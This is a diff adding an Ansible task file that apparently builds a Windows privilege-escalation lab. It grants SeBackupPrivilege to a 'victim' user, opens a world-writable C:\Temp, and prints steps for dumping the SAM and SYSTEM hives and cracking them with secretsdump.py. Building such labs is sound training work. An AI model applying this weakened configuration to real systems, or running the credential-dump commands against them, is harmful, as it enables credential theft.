@@ -1,0 +1,47 @@
+---
+# SeBackupPrivilege Lab Setup
+# Grants SeBackupPrivilege to the victim user so they can bypass file ACLs
+# and dump the SAM/SYSTEM hives to extract credentials.
+#
+# Reference: https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md
+
+- name: Grant SeBackupPrivilege to victim user via secedit
+  ansible.windows.win_shell: |
+    $cfgFile = "$env:TEMP\sebackup_cfg.ini"
+    $dbFile  = "$env:TEMP\sebackup_db.sdb"
+
+    & secedit /export /cfg $cfgFile | Out-Null
+
+    if ("{{ ludus_win_privesc_victim_user_type }}" -eq "domain") {
+      $sidEntry = (New-Object System.Security.Principal.NTAccount("{{ ludus_win_privesc_domain | default("") }}\{{ ludus_win_privesc_victim_user }}")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+    } else {
+      $sidEntry = (Get-LocalUser -Name "{{ ludus_win_privesc_victim_user }}").SID.Value
+    }
+    $content  = Get-Content $cfgFile
+    $newLine  = "SeBackupPrivilege = *$sidEntry"
+
+    if ($content -match 'SeBackupPrivilege') {
+      $content = $content -replace 'SeBackupPrivilege\s*=.*', $newLine
+    } else {
+      $privIdx = ($content | Select-String '\[Privilege Rights\]').LineNumber
+      $content = $content[0..($privIdx - 1)] + $newLine + $content[$privIdx..($content.Length - 1)]
+    }
+    $content | Set-Content $cfgFile
+
+    & secedit /import /cfg $cfgFile /db $dbFile /overwrite /quiet | Out-Null
+    & secedit /configure /db $dbFile /quiet | Out-Null
+    Remove-Item $cfgFile, $dbFile -ErrorAction SilentlyContinue
+
+- name: Create temp exfil directory (world-writable)
+  ansible.windows.win_shell: |
+    New-Item -ItemType Directory -Force -Path "C:\Temp" | Out-Null
+    icacls "C:\Temp" /grant Everyone:F | Out-Null
+
+- name: Print SeBackupPrivilege scenario info
+  ansible.builtin.debug:
+    msg:
+      - "=== SeBackupPrivilege Scenario ==="
+      - "User '{{ ludus_win_privesc_victim_user }}' has SeBackupPrivilege."
+      - "Copy hives: reg save HKLM\\SAM C:\\Temp\\sam.hive"
+      - "           reg save HKLM\\SYSTEM C:\\Temp\\system.hive"
+      - "Then crack with: secretsdump.py -sam sam.hive -system system.hive LOCAL"
